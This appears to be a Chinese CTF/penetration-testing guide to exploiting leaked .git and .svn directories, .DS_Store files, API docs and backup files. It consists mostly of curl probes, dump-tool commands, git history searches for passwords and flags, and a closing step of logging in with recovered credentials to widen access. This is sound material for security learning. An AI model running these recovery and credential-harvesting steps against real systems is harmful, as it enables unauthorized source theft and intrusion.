# 源码恢复与信息泄露深度利用

## 目录

- [快速决策树](#快速决策树)
- [.git 源码泄露完整利用链](#git-源码泄露完整利用链)
- [.svn 源码泄露利用](#svn-源码泄露利用)
- [.DS_Store 解析](#ds_store-解析)
- [Swagger/OpenAPI 利用](#swaggeropenapi-利用)
- [备份和日志文件](#备份和日志文件)
- [源码中的硬编码凭据搜索](#源码中的硬编码凭据搜索)

---

## 快速决策树

发现版本控制泄露后的优先行动：

```
/.git/HEAD 返回 200?
  ├─ 是 → git-dumper 整体 dump → git log 审计历史 → 搜索凭据/flag
  └─ 403 → 尝试 /.git/config, /.git/logs/HEAD → 能访问则手动恢复

/.svn/entries 返回 200?（或 /.svn/wc.db）
  ├─ entries 有内容 → svn-extractor dump
  └─ wc.db 可下载 → sqlite3 查询文件列表 → 逐个下载

发现源码后 → 立即搜索凭据（密码、API key、数据库连接串）→ 利用凭据登录
```

---

## .git 源码泄露完整利用链

**核心价值**：`.git` 泄露不仅能恢复当前源码，还能恢复整个提交历史——开发者删除过的密码、测试账号、flag 都在历史提交里。

### Step 1: 确认泄露

```bash
curl -s -o /dev/null -w "%{http_code}" http://target/.git/HEAD
# 200 → 泄露确认
# 403 → 目录被禁但文件可能可访问（见「部分封禁绕过」）
```

同时检查 `.git/config`，它经常暴露内部仓库地址：
```bash
curl -s http://target/.git/config
# [remote "origin"] url = https://git.company.com/internal/project.git
```

### Step 2: 整体 Dump

**git-dumper（快速恢复源码）：**
```bash
pip3 install git-dumper 2>/dev/null
git-dumper http://target/.git/ /tmp/git-dump/
cd /tmp/git-dump/
```

git-dumper 会自动遍历 refs、objects、packs，重建完整的 `.git` 目录。完成后 `/tmp/git-dump/` 就是一个合法的 git 仓库。

**GitHacker（推荐，恢复更完整——含 stash/所有分支/标签）：**
```bash
pip install GitHacker 2>/dev/null
githacker --brute --url http://target/.git/ --output-folder result
```

GitHacker 的 `--brute` 模式会暴力枚举分支和标签名，即使目标关闭了目录列表也能恢复。stash 里经常藏着开发者暂存的敏感修改。

**GitHack（备选）：**
```bash
python3 GitHack.py http://target/.git/
```

### Step 3: 审计提交历史（关键步骤）

dump 完成后，进入仓库目录，**先看历史再看代码**——开发者经常在早期提交里留下敏感信息，后来删除但历史里还在：

```bash
cd /tmp/git-dump/

# 查看所有提交历史（最重要）
git log --all --oneline

# 查看每次提交改了什么文件
git log --all --name-only --oneline

# 搜索提交消息中的关键词（"password", "secret", "flag", "remove", "delete"）
git log --all --oneline --grep="password"
git log --all --oneline --grep="flag"
git log --all --oneline --grep="secret"
git log --all --oneline --grep="remove"   # 开发者说"removed password"时，密码就在上一个提交

# 搜索所有提交内容中包含关键词的变更
git log --all -p -S "password"   # 哪个提交添加或删除了 "password" 字符串
git log --all -p -S "flag{"
git log --all -p -S "secret_key"
```

### Step 4: 检查特殊区域

```bash
# stash — 开发者临时保存的未提交改动，经常包含调试代码、硬编码密码
git stash list
git stash show -p stash@{0}

# 所有分支（包括远程分支引用）
git branch -a
# 切到其他分支查看
git checkout dev 2>/dev/null || git checkout develop 2>/dev/null

# 查看所有 tag
git tag -l
git show v1.0

# reflog — 即使提交被 reset/rebase 掉，reflog 里还有
git reflog
```

### Step 5: 从历史中提取敏感信息

```bash
# 对比当前和某个旧提交
git diff HEAD <old-commit-hash>

# 查看某个特定文件在某次提交时的内容
git show <commit-hash>:config.py
git show <commit-hash>:.env
git show <commit-hash>:settings.py

# 批量搜索所有历史中的敏感字符串
git grep -n "password" $(git rev-list --all)
git grep -n "flag{" $(git rev-list --all)
git grep -n "mysql://" $(git rev-list --all)
```

### 部分封禁绕过

有时管理员禁止了 `/.git/` 目录列表（返回 403），但具体文件仍可访问。这是因为 Web 服务器禁止了目录浏览但没有阻止文件请求：

```bash
# 目录返回 403
curl -s http://target/.git/       # → 403

# 但具体文件可以读
curl -s http://target/.git/HEAD   # → ref: refs/heads/main  ← 200!
curl -s http://target/.git/config
curl -s http://target/.git/logs/HEAD
```

如果具体文件可读，git-dumper 通常仍然能工作（它不依赖目录列表）。如果 git-dumper 也失败，手动恢复：

```bash
# 1. 获取 HEAD 引用
curl -s http://target/.git/HEAD
# → ref: refs/heads/main

# 2. 获取该引用的 commit hash
curl -s http://target/.git/refs/heads/main
# → a1b2c3d4e5f6...

# 3. 获取 logs/HEAD（包含所有历史 commit hash）
curl -s http://target/.git/logs/HEAD
# 每行格式: old_hash new_hash author timestamp message

# 4. 下载 object（hash 前2位是目录名，剩余是文件名）
# 比如 hash = a1b2c3d4e5...
curl -s http://target/.git/objects/a1/b2c3d4e5... -o obj.bin
# 用 python 解压: zlib.decompress(open('obj.bin','rb').read())
```

### .git 利用中常见的 CTF 模式

| 模式 | 说明 |
|------|------|
| flag 在旧提交里 | `git log -p` 发现某次提交删除了 flag |
| 密码在 .env 历史里 | 当前 .env 是空的，但 `git show HEAD~3:.env` 有密码 |
| stash 里有后门 | `git stash show -p` 看到调试密码 |
| config 暴露内部地址 | `.git/config` 的 remote URL 指向内网仓库 |
| 备份文件在 .bak 提交 | 某次提交添加了 `console.bak` 等文件 |

---

## .svn 源码泄露利用

SVN（Subversion）泄露的利用思路和 Git 类似，但目录结构不同。SVN 客户端会在工作目录下创建 `.svn/` 目录，包含所有文件的元数据和副本。

### Step 1: 确认泄露

```bash
# SVN 1.6 及更早版本
curl -s -o /dev/null -w "%{http_code}" http://target/.svn/entries
# 200 且内容非 HTML → SVN 泄露确认

# SVN 1.7+ 版本（entries 被 wc.db 替代）
curl -s -o /dev/null -w "%{http_code}" http://target/.svn/wc.db
# 200 → SVN 1.7+ 泄露确认
```

### Step 2: 使用工具 Dump

**svn-extractor（推荐）：**
```bash
pip3 install svn-extractor 2>/dev/null
svn-extractor --url http://target/.svn/ --match "\.php$|\.py$|\.js$|\.env|config|flag"
```

**dvcs-ripper（备选）：**
```bash
perl rip-svn.pl -v -u http://target/.svn/
```

### Step 3: 手动恢复（工具不可用时）

**SVN 1.6（entries 文件是纯文本）：**
```bash
# 下载 entries 文件
curl -s http://target/.svn/entries

# entries 文件格式（每 N 行描述一个文件）：
# 文件名
# 类型（file/dir）
# 版本号
# ...
# 从中提取出所有文件路径

# 文件内容在 text-base 目录下：
curl -s http://target/.svn/text-base/index.php.svn-base
curl -s http://target/.svn/text-base/config.php.svn-base
curl -s http://target/.svn/text-base/.env.svn-base
```

**SVN 1.7+（wc.db 是 SQLite 数据库）：**
```bash
# 下载 wc.db
curl -s http://target/.svn/wc.db -o /tmp/wc.db

# 查询文件列表
sqlite3 /tmp/wc.db "SELECT local_relpath, checksum FROM NODES WHERE kind='file';"

# 文件内容在 pristine 目录下，以 checksum 的 sha1 命名：
# checksum 格式: $sha1$abcdef1234567890...
# 文件路径: .svn/pristine/ab/abcdef1234567890....svn-base
curl -s http://target/.svn/pristine/ab/abcdef1234567890abcdef1234567890abcdef12.svn-base
```

### SVN 利用要点

- SVN 没有像 Git 那样丰富的本地历史浏览能力，但 `entries` 和 `wc.db` 会暴露**所有被版本控制的文件路径**，包括你通过目录扫描找不到的隐藏文件
- `wc.db` 的 `NODES` 表里 `changed_revision` 字段可以看到每个文件的最后修改版本号
- 有些 SVN 部署会暴露 `/.svn/prop-base/` 下的属性文件，可能包含额外元数据

---

## .DS_Store 解析

macOS 生成的 `.DS_Store` 文件包含目录中的文件名列表——相当于免费的目录扫描结果：

```bash
# 简单 strings 提取（通常够用）
curl -s http://target/.DS_Store | strings | sort -u

# Python 库精确解析
pip3 install ds-store 2>/dev/null
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/DS_Store') as ds:
    for entry in ds:
        print(entry.filename)
"
```

发现的文件名可能包括：`flag.txt`、`admin/`、`backup.sql`、`.env` 等目录扫描字典里没有的路径。

---

## Swagger/OpenAPI 利用

发现 API 文档后重点关注：
- **隐藏端点**：文档中有但页面没展示的 API（如 `/api/admin/flag`）
- **参数定义**：知道确切参数名和类型，可精准构造请求
- **认证方式**：Bearer token/API key/Basic auth

### API 文档泄露路径
```
/docs (FastAPI)
/swagger (Swagger UI)
/swagger.json
/openapi.json
/redoc
/api-docs
/graphql (GraphQL Playground)
```

---

## 备份和日志文件

```
/backup.zip       /backup.tar.gz     /www.zip         /www.tar.gz
/app.py.bak       /config.py.bak     /index.php.bak   /web.config.bak
/.env.bak         /.env.old          /.env.example
/access.log       /error.log         /debug.log
```

---

## 源码中的硬编码凭据搜索

发现源码后（无论来自 .git dump、备份文件、还是 .svn 恢复），立即搜索：

- **密码**: `password`, `passwd`, `pwd`, `secret`, `credential`
- **API 密钥**: `api_key`, `apikey`, `token`, `auth`, `bearer`
- **数据库连接**: `mysql://`, `postgres://`, `sqlite`, `mongodb://`, `redis://`
- **SSH/远程**: SSH 用户名和密码、私钥路径
- **Base64 编码**: 解码可疑的 Base64 字符串
- **flag 格式**: `flag{`, `flag-{`, `ctf{`, `key{`

```bash
# 在 dump 出的源码目录中批量搜索
cd /tmp/git-dump/  # 或 svn-dump 目录
grep -rn "password\|passwd\|secret\|api_key\|flag{" . --include="*.py" --include="*.php" --include="*.js" --include="*.env" --include="*.yml" --include="*.conf"
```

**找到凭据后立即使用**：登录 Web、SSH（注意 Docker 映射高端口）、数据库连接。不要继续搜索——先用已有凭据扩大访问权限。
